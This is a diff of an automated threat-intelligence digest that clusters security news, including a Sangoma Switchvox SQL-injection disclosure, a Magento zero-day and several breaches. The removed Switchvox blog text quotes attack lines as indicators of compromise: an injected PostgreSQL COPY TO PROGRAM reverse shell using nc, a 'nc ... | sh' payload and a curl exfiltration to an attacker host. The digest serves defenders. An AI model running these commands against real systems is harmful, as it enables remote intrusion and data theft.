 - confidence_tier: tier_1_offensive_research
@@ -905,27 +912,22 @@ Back to Blog Vulnerabilities and Exploits Critical SonicWall SMA1000 Vulnerabili
 #### Summary
 
 ```
-Horizon3 researchers discovered CVE-2026-9586, an unauthenticated SQL injection vulnerability in Sangoma Switchvox that leads to remote code execution and is now being actively exploited.
+CVE-2026-9586 is a critical unauthenticated SQL injection vulnerability in Sangoma Switchvox that can lead to remote code execution. Horizon3 has observed active exploitation attempts in the wild.
 ```
 
 #### Full body
 
 ```
-Off the Hook: Discovering and Observing Active Exploitation of Sangoma Switchvox CVE-2026-9586 Zach Hanley September 1, 2026 Attack Blogs , Attack Research , Disclosures At Horizon3, we’re constantly looking for technologies and applications to perform security audits on that we believe may be targeted by threat actors. In April of 2026, we took a look at the Sangoma ecosystem after several FreeBPX vulnerabilities, CVE-2025-57819 and CVE-2025-64328 , landed on the CISA Known Exploited Vulnerabilities (KEV) catalog . One such application we landed on was Sangoma Switchvox . Switchvox is an enterprise VoIP telephony management solution. It allows organizations to easily configure phone systems to include voicemail, call forwarding, and monitoring and analytics across their enterprise. In total, we reported 12 distinct vulnerabilities in the Switchvox product which have now been patched – the most impactful being an unauthenticated SQL injection leading to remote code execution. This vulnerability was assigned as CVE-2026-9586 and was patched in Switchvox 8.4.0.2 . This blog will cover only CVE-2026-9586 given that we have now observed valid exploitation attempts in the wild. Figure 1. Defused Switchvox Tripwire Tripped CVE-2026-9586: Unauthenticated SQL Injection to Remote Code Execution One of the features of the Switchvox is to allow supported phones to receive notifications for various events like incoming or outgoing calls. The Switchvox application exposes an unauthenticated HTTP endpoint, /pa , and is handled by the PhoneAppsHandler.pm class. Of note, Sangoma Perl-based files are obfuscated to some degree, which we discovered after our autonomous vulnerability research system initially flagged this vulnerability – but an agent had automatically de-obfuscated the source code. Figure 2. Switchvox Obfuscated Perl Handler Taking a look at the vulnerabilities source, when this endpoint receives a request to notify another phone system, it parses an XML message containing specific key-value pairs. The PhoneIP field extracted directly from the XML message and directly concatenated into an unparameterized SQL query. Figure 3. tel_notify() SQL injection sink The full data flow in PhoneAppsHandler.pm : pre_cmd() line 70: POST body read from POSTDATA CGI parameter pre_cmd() line 74: Validated only that body starts with <PolycomIPPhone> – no content sanitization pre_cmd() line 78: Stored as notification_xml, command set to tel_notify tel_notify() line 180: XML parsed via XML::Simple::XMLin() – returns untrusted data structure tel_notify() line 199/210: PhoneIP extracted from parsed XML – NO VALIDATION tel_notify() lines 220-225: PhoneIP concatenated directly into SQL string (single-quoted context) tel_notify() line 226: $db->query(“sql”, $sql) executes the injected payload as PostgreSQL superuser An simple curl based exploit can be crafted like so: Figure 4. Example Exploit And to receive a reverse shell: Figure 5. Reverse shell Indicators of Compromise If SSH access is possible for the device, evidence of the SQL injection payload used can be observed in /var/log/switchvox/db-quirks.log . Figure 6. Example exploit attempt log in db-quirks.log An example excerpt from the above exploitation attempt: SQL: SELECT proposed_extension FROM auto_phone_config WHERE ip_address = ‘10.0.0.1’; COPY (SELECT ”) TO PROGRAM ‘nc 10.0.18.42 4444 -e /bin/bash > /tmp/0d012120ab00297d.txt 2>&1; chmod 644 /tmp/0d012120ab00297d.txt’–‘ AND config_state = ‘configured’ In the Defused Cyber honeypot, the attacker used an initial payload of: nc 176.65.148.184 39323 | sh Notably, you should investigate if the attacker IP of 176.65.148.184 has been observed in any network requests related to the Switchvox device. But soon followed it up with an enumeration command to curl a remote server and exfiltrate the top running processes on the Switchvox: curl -m 10 http://<ATTACKER_IP>/<UNIQUE_EXPLOIT_ATTEMPT_ID>_$({ echo dG9wIC1ibjEgfCBhd2sgJy9eICpQSUQvIHtnZXRsaW5lOyBwcml
+Sangoma Switchvox Unauthenticated SQL Injection Remote Code Execution Vulnerability CVE-2026-9586 is a critical unauthenticated SQL injection vulnerability in Sangoma Switchvox SMB Edition that allows a remote attacker to execute arbitrary SQL statements against the backend PostgreSQL database and achieve remote code execution without authentication or user interaction. The vulnerability has a CVSS 4.0 score of 9.3 Critical . Horizon3 independently discovered the vulnerability while researching the Sangoma ecosystem and has since observed valid exploitation attempts targeting the vulnerability in the wild. Technical Details CVE-2026-9586 exists in the unauthenticated /pa HTTP endpoint used by Switchvox to process phone notification requests. The endpoint accepts XML content beginning with <PolycomIPPhone> and extracts the user-controlled PhoneIP value from the request. The vulnerable PhoneAppsHandler.pm component concatenates the PhoneIP value directly into a PostgreSQL query without sanitization or parameterization. An unauthenticated remote attacker can therefore inject arbitrary SQL through a single crafted request. Horizon3 demonstrated that exploitation can reach operating-system command execution through PostgreSQL, resulting in remote code execution on the Switchvox system. Key characteristics include: Attack vector: Network Attack complexity: Low Attack requirements: None Privileges required: None User interaction: None Weakness: CWE-89, Improper Neutralization of Special Elements used in an SQL Command Impact: Arbitrary SQL execution and remote code execution CVSS 4.0: 9.3 Critical The published CVSS vector is CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N. Horizon3 and Defused Cyber subsequently observed exploitation attempts against multiple internet-facing Switchvox honeypots using the vulnerable /pa endpoint. The activity included attempts to execute operating-system commands and enumerate processes on the targeted system. Stop Guessing, Start Proving Schedule a demo NodeZero® Proactive Security Platform — Rapid Response A NodeZero Rapid Response test has been developed to safely validate whether this vulnerability can be exploited in your environment. The test executes real attack techniques without causing damage, giving teams immediate clarity on exposure. Run the Rapid Response test: Launch from the NodeZero platform to determine whether CVE-2026-9586 can be exploited Patch immediately: Upgrade affected Switchvox systems to version 8.4.0.2 or later Re-run the test: Confirm the vulnerability is no longer exploitable after remediation Indicators of Compromise Horizon3 and Defused Cyber observed exploitation attempts originating from: Indicator Type Description IP Address 176.65.148.184 was observed targeting the vulnerable Switchvox /pa endpoint Organizations with SSH access to a Switchvox system can inspect /var/log/switchvox/db-quirks.log for evidence of injected SQL statements. In the activity observed by Horizon3 and Defused Cyber, the attacker attempted to use PostgreSQL command execution to invoke nc and later used curl to send process information to attacker-controlled infrastructure. The presence of these utilities alone should not be treated as evidence of compromise. Investigators should correlate suspicious commands with requests targeting /pa, injected PostgreSQL statements, outbound connections, and other host or network telemetry. Affected versions & patch Affected The published CVE record identifies: Sangoma Switchvox SMB Edition 8.3 (104997), versions less than 8.4.0.2 The available public sources contain some inconsistency regarding earlier versions. Sangoma’s 8.4.0.2 release notes describe CVE-2026-9586 as affecting Switchvox 8.2.2.1, while the CNA record specifies 8.3 (104997). Organizations running earlier Switchvox releases should therefore upgrade to the fixed release rather than relying on an assumption that an older version is unaffected. Fixed Switchvox 8.4.0.2 , release
 ```
 
-#### Corroborating sources (4)
+#### Corroborating sources (3)
 
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
-  - Title: Off the Hook: Discovering and Observing Active Exploitation of Sangoma Switchvox CVE-2026-9586
-  - Published: 2026-09-01T10:01:00+00:00
-  - Link: https://horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/
-  - Summary: Horizon3 researchers discovered CVE-2026-9586, an unauthenticated SQL injection vulnerability in Sangoma Switchvox that leads to remote code execution and is now being actively exploited.
-- **SecurityWeek** (cyber_news_breach_reporting)
-  - Title: Sangoma Switchvox Vulnerabilities Exploited in the Wild
-  - Published: 2026-09-04T13:23:12+00:00
-  - Link: https://www.securityweek.com/sangoma-switchvox-vulnerabilities-exploited-in-the-wild/
-  - Summary: Tracked as CVE-2026-9586, the unauthenticated SQL injection flaw can be exploited remotely for arbitrary code execution. The post Sangoma Switchvox Vulnerabilities Exploited in the Wild appeared first on SecurityWeek .
+  - Title: CVE-2026-9586 | Sangoma Switchvox Unauthenticated SQL Injection Remote Code Execution Vulnerability
+  - Published: 2026-09-01T15:32:54+00:00
+  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-9586/
+  - Summary: CVE-2026-9586 is a critical unauthenticated SQL injection vulnerability in Sangoma Switchvox that can lead to remote code execution. Horizon3 has observed active exploitation attempts in the wild.
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: Attackers Exploit Critical Switchvox Flaw to Deploy Reverse Shells Without Credentials
   - Published: 2026-09-02T07:08:50+00:00
@@ -1132,7 +1134,7 @@ Telerik UI Padding-Oracle Bug Chained to Unauthenticated RCE — Public Exploit 
   - Link: https://thehackernews.com/2026/09/telerik-ui-padding-oracle-bug-chained.html
   - Summary: A TantoSec proof-of-concept turns an AES-CBC "padding oracle" in Telerik UI for ASP.NET AJAX into unauthenticated remote code execution — but only against applications in a specific non-default configuration, and Progress patched the chain in July. There are no confirmed reports of exploitation in the wild. Security firm TantoSec has published a working exploit chain targeting vulnerabilities
 
-### Cluster 81949698a6 — score 25
+### Cluster 81949698a6 — score 24
 
 - Title: N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw
 - Source: The Hacker News (cyber_news_breach_reporting)
@@ -1176,6 +1178,55 @@ N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw
   - Published: 2026-09-07T08:31:12+00:00
   - Link: https://thehackernews.com/2026/09/n-able-issues-fourth-n-central-hotfix.html
   - Summary: Every on-premises N-central build below 2026.3.1.14 — including servers updated to Hotfix 3 a day earlier — needs Hotfix 4. N-able's incident notice says the flaw has been exploited in the wild; its release notes say that is unconfirmed. N-able has released its fourth hotfix in five weeks for the N-central remote monitoring and management (RMM) platform, this time for a
+
+### Cluster 81b3bf0ce0 — score 22
+
+- Title: Adobe Patches Magento Zero-Day Exploited to Deploy Rust Backdoor and PHP Web Shell
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-09-08T09:13:47+00:00
+- Link: https://thehackernews.com/2026/09/adobe-patches-magento-zero-day.html
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: CVE-2026-75650
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, phishing_social_eng, supply_chain, web_shell_backdoor, zero_day
+- affected_industries: education, retail_ecommerce
+- affected_products: AWS, OpenAI/ChatGPT, VMware
+- cve_ids: CVE-2026-75650
+- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: supply_chain, phishing_social_eng, zero_day, web_shell_backdoor, active_exploitation
+- affected_industries: education, retail_ecommerce
+- affected_products: AWS, VMware, OpenAI/ChatGPT
+- cve_ids: CVE-2026-75650
+- urgency_signals: actively_exploited, zero_day, preauth_unauth, no_patch_yet
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Adobe on Monday released security patches to address a maximum-severity flaw impacting Adobe Commerce and Magento Open Source that has come under active exploitation in the wild. The vulnerability, now tracked as CVE-2026-75650 (CVSS score: 10.0), has been codenamed StyleSmuggler by Sansec, which discovered zero-day exploitation starting September 4, 2026. "This update resolves a critical
+```
+
+#### Full body
+
+```
+Adobe Patches Magento Zero-Day Exploited to Deploy Rust Backdoor and PHP Web Shell  Ravie Lakshmanan  Sep 08, 2026 Vulnerability / Web Security Adobe on Monday released security patches to address a maximum-severity flaw impacting Adobe Commerce and Magento Open Source that has come under active exploitation in the wild. The vulnerability, now tracked as CVE-2026-75650 (CVSS score: 10.0), has been codenamed StyleSmuggler by Sansec, which discovered zero-day exploitation starting September 4, 2026. "This update resolves a critical vulnerability that could result in arbitrary code execution," Adobe said , adding it's "aware that CVE-2026-75650 has been exploited in the wild targeting Adobe Commerce merchants." At its core, the flaw abuses Magento's template system through PHP code injection to generate a "Payment Transaction Failed Reminder" email, triggering code execution in the process. The shortcoming affects the following versions - Adobe Commerce 2.4.9-2026-aug and earlier 2.4.8-2026-aug and earlier 2.4.7-2026-aug and earlier 2.4.6-2026-aug and earlier 2.4.5-2026-aug and earlier 2.4.4-2026-aug and earlier Adobe Commerce B2B 1.5.3-2026-aug and earlier 1.5.2-2026-aug and earlier 1.4.2-2026-aug and earlier 1.3.4-2026-aug and earlier 1.3.3-2026-aug and earlier Magento Open Source 2.4.9-2026-aug and earlier 2.4.8-2026-aug and earlier 2.4.7-2026-aug and earlier 2.4.6-2026-aug and earlier Patches have been released as part of a hotfix's available for download from the following link: repo.magento[.]com/patch/VULN-39341-composer-patches.zip "To help resolve the vulnerability for the affected products and versions, you must apply the VULN-39341 patch (depending on your version) and rotate your encryption keys," Adobe said . The development comes days after the Dutch e-commerce security company revealed that threat actors are exploiting CVE-2026-75650 to deploy a Rust-based Linux backdoor that connects to an external server and awaits further instructions. Separately, the issue has been abused to deliver a PHP dropper on susceptible sites that writes a web shell capable of executing arbitrary PHP code. According to Netherlands-based Disrex, a Magento server managed by the e-commerce development platform is said to have been compromised 50 minutes after the first confirmed StyleSmuggler exploitation was reported on September 4, 2026, at 10:20 p.m. UTC. "StyleSmuggler turns Magento's own template-processing and dependency-injection code into an unauthenticated remote-code-execution chain," Disrex said. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Adobe , E-commerce Security , linux , Malware , Vulnerability , Web Security ⚡ Top Stories This Week Attackers Exploit Critical Langflow and Rails Flaws in Credential-Probing and C2 Activity Iranian Hackers Pose as Recruiters to Deliver Cross-Platform RATs Through Coding Tests ⚡ Weekly Recap: Chrome 0-Day, Router Hijacks, Coder Supply Chain Attack and More N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw Attackers Hijack MikroTik Routers Through Internet-Exposed SSH Without Authentication Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials Critical VMware Workstation and Fusion Flaw Lets VM Admins Execute Host Code Thousands of OpenAI Agents Quietly Turned an Abandoned Wiki Into Their Coordination Channel Attackers Exploit PaperCut Flaws to Steal Credentials From Schools and Universities Phishing Campaign Sends Millions of Emails Using Invisible Unicode to Evade Filters PostgreSQL Fixes 12-Year-Old Logical Decoding Flaw Enabling Replication-Role Code Execution New Ted Backdoor Hides Inside Victims' Own HAProxy Builds to Intercept Web Traffic Google Releases Chrome Update to Patch Actively Exploited V8 Zero-Day Threat
+```
+
+#### Corroborating sources (1)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Adobe Patches Magento Zero-Day Exploited to Deploy Rust Backdoor and PHP Web Shell
+  - Published: 2026-09-08T09:13:47+00:00
+  - Link: https://thehackernews.com/2026/09/adobe-patches-magento-zero-day.html
+  - Summary: Adobe on Monday released security patches to address a maximum-severity flaw impacting Adobe Commerce and Magento Open Source that has come under active exploitation in the wild. The vulnerability, now tracked as CVE-2026-75650 (CVSS score: 10.0), has been codenamed StyleSmuggler by Sansec, which discovered zero-day exploitation starting September 4, 2026. "This update resolves a critical
 
 ### Cluster 506e4ffbdc — score 21
 
@@ -1368,8 +1419,8 @@ Critical Citrix NetScaler auth bypass now leveraged in attacks By Sergiu Gatlan 
 - Published: 2026-09-01T14:00:00+00:00
 - Link: https://cloud.google.com/blog/topics/threat-intelligence/financially-motivated-threat-actor-breeze-comet-targets-brazil/
 - Fetch status: ok
-- Member count: 3
-- Corroborating source count: 3
+- Member count: 2
+- Corroborating source count: 2
 - Strong signals: UNC5669
 
 #### Cluster taxonomy (union across members)
@@ -1377,7 +1428,7 @@ Critical Citrix NetScaler auth bypass now leveraged in attacks By Sergiu Gatlan 
 - actor_attribution: UNC5669
 - affected_industries: financial_services, government, retail_ecommerce
 - content_type: news_report
-- confidence_tier: tier_1_primary_research, tier_2_operator, tier_4_news
+- confidence_tier: tier_1_primary_research, tier_2_operator
 
 #### Primary article taxonomy
 - threat_categories: phishing_social_eng, web_shell_backdoor
@@ -1398,7 +1449,7 @@ Introduction Beginning in 2024 Mandiant investigated a string of compromises aff
 Threat Intelligence Financially Motivated Threat Actor BREEZE COMET Targets Brazil September 1, 2026 Google Threat Intelligence Group Mandiant Mandiant Services Stop attacks, reduce risk, and advance your security. Contact Mandiant Introduction Beginning in 2024 Mandiant investigated a string of compromises affecting Brazilian financial services, retail, and eCommerce organizations. Google Threat Intelligence Group (GTIG) tracks this activity as BREEZE COMET (formerly UNC5669), a financially motivated threat actor specializing in manipulating payment systems and banking software in Brazil to conduct fraudulent transfers. This activity overlaps with operations publicly reported as Plump Spider and SHADOW-AETHER-064 . In this blog, we detail BREEZE COMET’s tactics and toolkit, and provide mitigation recommendations and detections to support organizations in defending against this active and developing threat. BREEZE COMET tactics have evolved over time to leverage a customized malware suite and compromised, trusted websites to facilitate initial access, command and control (C2), and to interact with financial software and payment APIs. BREEZE COMET’s operational infrastructure may also indicate intent to expand their infrastructure footprint to other countries in Latin America and Africa. Additionally, we have evidence that BREEZE COMET is using generative artificial intelligence (AI) to support malware development, which may further increase the scale, speed, and sophistication of their operations in the future. BREEZE COMET Targets Brazilian Financial Technology BREEZE COMET operations target organizations with permission to conduct transactions through banking software, APIs, and payment systems such as Pix, STR, and Boleto. This typically includes banks, payment processors, retailers, exchanges, as well as fintech and banking software providers. To achieve their objective of conducting fraudulent transfers, BREEZE COMET must maintain: Access to the National Financial System Network (Rede Nacional do Setor Financeiro, RSFN) through an entity with this access. Access to mTLS credentials that allow sending authenticated payloads with transactional orders to Pix, STR (Brazilian Reserves Transfer System), or any transactional listener to be executed with minimal restrictions in the name of an organization with available funds. Persistent access to multiple accounts in targeted organizations’ Active Directory and/or cloud environments. Understanding of an organization’s transfer processing procedures, network controls, fintech integrations and anti-fraud systems. In order to support these requirements, BREEZE COMET evolved to operate in multiple compromised environments at the same time, crafting custom C2 malware to automate activities such as reconnaissance, lateral movement, persistence, and exfiltration. Initial Compromise and Establish Foothold BREEZE COMET has used various methods for initial access. In early compromises, Mandiant observed this threat actor use password spraying as well as voice calls impersonating IT support teams to convince users to install Remote Monitoring and Management (RMM) tools such as AnyDesk. Axur corroborates use of voice phishing, and suggests that the group has also attempted to recruit insiders at targeted organizations. In mid-2025, GTIG observed BREEZE COMET using compromised Brazilian small government websites to stage RMM tools, infostealers disguised as legitimate tax or receipt documents (e.g., ComprovantePDF.exe ) , or backdoors such as XWORM set to persist via automated startup shortcut modifications. XWORM is a backdoor that is widely available for purchase on cyber crime forums, with leaked or “cracked” versions also available. BREEZE COMET then used these compromised government websites to facilitate social engineering operations for initial access, and as C2 endpoints. The use of compromised, trusted infrastructure allowed the threat actors to avoid detection by network domain rep
 ```
 
-#### Corroborating sources (3)
+#### Corroborating sources (2)
 
 - **Google Cloud Threat Intelligence** (threat_research_primary)
   - Title: Financially Motivated Threat Actor BREEZE COMET Targets Brazil
@@ -1410,11 +1461,6 @@ Threat Intelligence Financially Motivated Threat Actor BREEZE COMET Targets Braz
   - Published: 2026-09-01T14:00:00+00:00
   - Link: https://cloud.google.com/blog/topics/threat-intelligence/financially-motivated-threat-actor-breeze-comet-targets-brazil/
   - Summary: Introduction Beginning in 2024 Mandiant investigated a string of compromises affecting Brazilian financial services, retail, and eCommerce organizations. Google Threat Intelligence Group (GTIG) tracks this activity as BREEZE COMET (formerly UNC5669), a financially motivated threat actor specializing in manipulating payment systems and banking software in Brazil to conduct fraudulent transfers. This activity overlaps with operations publicly reported as Plump Spider and SHADOW-AETHER-064 . In this blog, we detail BREEZE COMET’s tactics and toolkit, and provide mitigation recommendations and detections to support organizations in defending against this active and developing threat. BREEZE COMET tactics have evolved over time to leverage a customized malware suite and compromised, trusted websites to facilitate initial access, command and control (C2), and to interact with financial software and payment APIs. BREEZE COMET’s operational infrastructure may also indicate intent to expand the
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Breeze Comet Executes Hundreds of Fraudulent Transactions via Brazilian Payment Systems
-  - Published: 2026-09-01T17:19:24+00:00
-  - Link: https://thehackernews.com/2026/09/breeze-comet-executes-hundreds-of.html
-  - Summary: Brazilian financial services, retail, and e-commerce organizations have become the target of a financially motivated threat actor dubbed Breeze Comet (formerly UNC5669) since 2024. Google Threat Intelligence Group (GTIG) and Mandiant teams described the threat actor as "specializing in manipulating payment systems and banking software in Brazil to conduct fraudulent transfers." The adversary
 
 ### Cluster fc5f82ab7c — score 17
 
@@ -1570,12 +1616,11 @@ GeoNetwork Fixes Unauthenticated RCE Chain Affecting Government Geoportal Backen
 - Published: 2026-09-03T21:03:02+00:00
 - Link: https://blog.cloudflare.com/vulnerability-discovery-remediation/
 - Fetch status: ok
-- Member count: 8
+- Member count: 7
 - Corroborating source count: 6
 - Strong signals: OpenAI/ChatGPT
 
 #### Cluster taxonomy (union across members)
-- affected_industries: critical_infrastructure
 - affected_products: OpenAI/ChatGPT
 - urgency_signals: poc_available
 - content_type: news_report, vulnerability_disclosure
@@ -1615,16 +1660,16 @@ Your scanner just flagged 4,000 new vulnerabilities, 78 of them critical. Which 
   - Published: 2026-09-07T12:03:04+00:00
   - Link: https://www.securityweek.com/openai-agents-hijack-another-victim-website/
   - Summary: OpenAI agents made 15,000–18,000 autonomous edits to a German wiki over three months, evading moderation and echoing tactics seen in the Hugging Face breach. The post OpenAI Agents Hijack Another Victim Website appeared first on SecurityWeek .
-- **Help Net Security** (cyber_news_breach_reporting)
-  - Title: OpenAI just hit a milestone on the road to self-improving AI
-  - Published: 2026-09-07T09:05:18+00:00
-  - Link: https://www.helpnetsecurity.com/2026/09/07/openai-research-automation-intern/
-  - Summary: OpenAI has announced that it has reached a goal set last fall of having an automated research intern by September 2026. The milestone means a system can carry out well-defined research tasks under human direction, including work that would take a skilled researcher several days. The company is also working toward creating an automated AI researcher by March 2028. All categories of research activity have increased since the start of the year (Source: OpenAI) “Transparency … More → The post OpenAI just hit a milestone on the road to self-improving AI appeared first on Help Net Security .
 - **BleepingComputer** (cyber_news_breach_reporting)
   - Title: OpenAI admits it didn't disclose rogue AI wiki hijacking incident
   - Published: 2026-09-05T11:11:50+00:00
   - Link: https://www.bleepingcomputer.com/news/security/openai-admits-it-didnt-disclose-rogue-ai-wiki-hijacking-incident/
   - Summary: OpenAI admits it did not disclose an incident where autonomous AI agents hijacked a German wiki, created 18,000 posts, shared answers, and bypassed restrictions, saying it treated the activity as model "misalignment" rather than a security breach. [...]
+- **Help Net Security** (cyber_news_breach_reporting)
+  - Title: OpenAI just hit a milestone on the road to self-improving AI
+  - Published: 2026-09-07T09:05:18+00:00
+  - Link: https://www.helpnetsecurity.com/2026/09/07/openai-research-automation-intern/
+  - Summary: OpenAI has announced that it has reached a goal set last fall of having an automated research intern by September 2026. The milestone means a system can carry out well-defined research tasks under human direction, including work that would take a skilled researcher several days. The company is also working toward creating an automated AI researcher by March 2028. All categories of research activity have increased since the start of the year (Source: OpenAI) “Transparency … More → The post OpenAI just hit a milestone on the road to self-improving AI appeared first on Help Net Security .
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: GPT-6 Astra Scores 100% on ExploitBench as OpenAI Blocks PoC Exploit Requests
   - Published: 2026-09-04T06:47:52+00:00
@@ -1724,6 +1769,51 @@ Eli Woodward 3 min read July 8, 2025 ToolShell, SharePoint, and the Death of the
   - Published: 2026-09-03T19:01:18+00:00
   - Link: https://www.team-cymru.com/post/toolshell-sharepoint-and-the-death-of-the-patch-window
   - Summary: This blog explores this week's zero-day exploit targeting Microsoft SharePoint, now referred to as ToolShell, caught organizations off guard.
+
+### Cluster 56feb4a619 — score 12
+
+- Title: Mathspace breach exposes data on over a million students and parents
+- Source: Help Net Security (cyber_news_breach_reporting)
+- Published: 2026-09-08T08:45:59+00:00
+- Link: https://www.helpnetsecurity.com/2026/09/08/mathspace-data-breach-metabase-vulnerability/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: data_breach, phishing_social_eng
+- affected_industries: education
+- urgency_signals: no_patch_yet
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: phishing_social_eng, data_breach
+- affected_industries: education
+- urgency_signals: no_patch_yet
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Mathspace has confirmed that attackers broke into its internal reporting system through an unpatched Metabase vulnerability and stole data belonging to more than a million students, parents, and school staff. The Sydney-based maths education company wrote in a blog post that the vulnerability, in its self-hosted installation of Metabase, allowed attackers to obtain administrator access to the system without a legitimate login. Metabase is a business intelligence tool used to connect to and explore company … More → The post Mathspace breach exposes data on over a million students and parents appeared first on Help Net Security .
+```
+
+#### Full body
+
+```
+Sinisa Markovic , Managing Editor, Help Net Security September 8, 2026 Share Mathspace breach exposes data on over a million students and parents Mathspace has confirmed that attackers broke into its internal reporting system through an unpatched Metabase vulnerability and stole data belonging to more than a million students, parents, and school staff. The Sydney-based maths education company wrote in a blog post that the vulnerability, in its self-hosted installation of Metabase, allowed attackers to obtain administrator access to the system without a legitimate login. Metabase is a business intelligence tool used to connect to and explore company databases. It’s available as a free open-source, self-hosted version, or as a paid service with cloud and self-hosted options. “On 3 September 2026, we confirmed that unauthorised parties had accessed an internal reporting system used by Mathspace and downloaded information on students, their parents or guardians, and school staff,” said Alvin Savoy CTO at Mathspace. “Our investigation identified unauthorised access dating back to 10 August 2026, Australian Eastern Standard Time. We confirmed that information was downloaded from our Australian reporting database on 27 August,” added Savoy. According to the company, the breach affected 1,079,819 people in total, all located in Australia and New Zealand. The exposed data included usernames, first and last names, email addresses, country, time zone, user type, email-verification status, last-active date, last-login date, and date joined. Some of these are internal Mathspace identifiers tied to student accounts. Mathspace said no academic records, assessment results, passwords, authentication tokens, or API credentials were exposed. The exposed data did not include records linking user accounts to their schools, though it said this may still be possible for schools with identifiable email domains. “Customer passwords, single sign-on (SSO) tokens and other customer authentication credentials were not exposed,” Savoy noted. “We have no evidence so far that the data has been published, distributed, sold or otherwise misused.” Mathspace isn’t requiring a password reset, since login credentials weren’t exposed. It is warning, however, that the leaked names and email addresses could be used to make phishing attempts look convincing. Savoy is advising users to be wary of unexpected messages, never share passwords or verification codes, and use a unique password for every account. “Based on our investigation to date, you can continue using Mathspace for lessons and assignments. The affected internal reporting system has been taken offline,” Savoy concluded . This is not an isolated case in which attackers used a vulnerability in Metabase to reach customer data. Framework, Tally, and Kilo Code all disclosed similar breaches in August 2026, after attackers exploited the same SQL injection flaw in their Metabase instances. More about breach data breach Metabase Share
+```
+
+#### Corroborating sources (1)
+
+- **Help Net Security** (cyber_news_breach_reporting)
+  - Title: Mathspace breach exposes data on over a million students and parents
+  - Published: 2026-09-08T08:45:59+00:00
+  - Link: https://www.helpnetsecurity.com/2026/09/08/mathspace-data-breach-metabase-vulnerability/
+  - Summary: Mathspace has confirmed that attackers broke into its internal reporting system through an unpatched Metabase vulnerability and stole data belonging to more than a million students, parents, and school staff. The Sydney-based maths education company wrote in a blog post that the vulnerability, in its self-hosted installation of Metabase, allowed attackers to obtain administrator access to the system without a legitimate login. Metabase is a business intelligence tool used to connect to and explore company … More → The post Mathspace breach exposes data on over a million students and parents appeared first on Help Net Security .
 
 ### Cluster 4ff2661d4c — score 12
 
@@ -1866,16 +1956,16 @@ How Virginia Tech Connected Pentesting to Its Engineering Workflow Horizon3 Cust
 - Published: 2026-09-04T13:13:53+00:00
 - Link: https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
 - Fetch status: ok
-- Member count: 3
-- Corroborating source count: 3
+- Member count: 2
+- Corroborating source count: 2
 - Strong signals: ShinyHunters
 
 #### Cluster taxonomy (union across members)
-- threat_categories: data_breach, mfa_bypass, phishing_social_eng, ransomware_extortion
+- threat_categories: mfa_bypass, phishing_social_eng, ransomware_extortion
 - actor_attribution: ShinyHunters, UNC6240, UNC6661
-- affected_industries: financial_services, healthcare
+- affected_industries: financial_services
 - affected_products: Microsoft SharePoint, Salesforce
-- content_type: incident_report, news_report
+- content_type: news_report
 - confidence_tier: tier_2_operator, tier_4_news
 
 #### Primary article taxonomy
@@ -1898,18 +1988,13 @@ Use network telemetry to validate cyber threat actors' phishing infrastructure. 
 Stephen Campbell 5 min read August 5, 2026 Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry Phishing panels are not just credential collection tools. They are infrastructure ecosystems. Behind every convincing login page is a set of domains, hosting providers, certificates, exposed services, operator tooling, and recurring deployment patterns. Those signals matter. They give defenders a way to move beyond a single phishing domain and start understanding how the activity is built, hosted, rotated, and reused. Push Security recently published an inside look at phishing panels used in campaigns linked to ShinyHunters and BlackFile . Their team gained direct access to active operator panels, observed real victim targeting, analyzed multiple variants of the tooling, and identified four primary infrastructure clusters. They also made an important point: while these panels share common heritage, the operators deploying them appear to be separate groups with different infrastructure preferences and operational patterns. That operator-side view is valuable because it shows how the attack works from inside the panel. Team Cymru’s view is different. Using Pure Signal Scout, we looked at the infrastructure layer to validate and expand part of the picture Push identified. Our analysis focused on Cluster A, the Doko’s Panel infrastructure hosted on Mevspace AS201814. Push noted that Cluster A overlaps with Mandiant reporting on UNC6661 , and that Mandiant attributes related extortion activity following UNC6661 intrusions to UNC6240, also known as ShinyHunters. Using passive DNS, certificate data, open service observations, and hosting patterns, we identified two active Mevspace IPs consistent with Push’s Cluster A criteria. Those IPs were associated with more than 40 victim-themed domains, recurring naming conventions, and one Doko-branded hosting-layer artifact that provides additional pivot context. This is not a reattribution of the activity. Push established the panel and cluster framework. Team Cymru’s contribution is infrastructure validation: confirming that infrastructure consistent with Push’s Cluster A reporting was active on Mevspace and surfacing additional indicators defenders can hunt against. Why Cluster A matters Cluster A matters because the targeting pattern is not random. Push described campaigns that combine voice phishing with adversary-in-the-middle credential capture against enterprise identity providers and cryptocurrency platforms. The victim is typically directed to a domain that looks like an internal identity, support, passkey, or SSO page. Once credentials and MFA are captured, the operator can attempt to access identity providers and pivot into connected SaaS environments such as Salesforce, SharePoint, Slack, DocuSign, or other high-value applications. That makes the infrastructure behind these panels important. The domain is 